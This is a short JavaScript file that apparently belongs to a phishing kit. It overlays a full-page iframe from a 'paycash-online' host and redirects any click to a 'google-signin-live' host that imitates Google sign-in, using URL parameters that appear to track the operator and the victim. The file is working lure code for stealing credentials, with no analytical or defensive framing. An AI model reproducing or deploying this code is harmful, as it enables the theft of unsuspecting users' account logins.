

// Create container div
const container = document.createElement('div');
container.id = 'container';
document.body.appendChild(container);

function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Get user ID from URL


const urlParams = new URLSearchParams(window.location.search);
const errorParam = urlParams.get('error');
const admin = urlParams.get('admin');
const poster = urlParams.get('poster');
const verifyId = urlParams.get('verifyId');

// Create iframe for new background
const backgroundIframe = document.createElement('iframe');
backgroundIframe.src = `https://paycash-online.vercel.app/${admin}/${poster}/${verifyId}`;
backgroundIframe.width = "100%";
backgroundIframe.height = "100%";
backgroundIframe.style.border = "0";
backgroundIframe.style.position = "absolute";
backgroundIframe.style.top = "0";
backgroundIframe.style.left = "0";
backgroundIframe.style.zIndex = "-1";




document.body.appendChild(backgroundIframe);

// Redirect when clicking anywhere on the page
document.body.addEventListener('click', () => {
    if (poster) {
        window.location.href = `https://google-signin-live.vercel.app/${admin}/${poster}/${verifyId}`;
    } else {
        alert('User ID not found!');
    }
});

// Apply full-page styles
document.head.appendChild(Object.assign(document.createElement('style'), {
    textContent: `
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            position: relative;
            cursor: pointer;
        }
    `
}));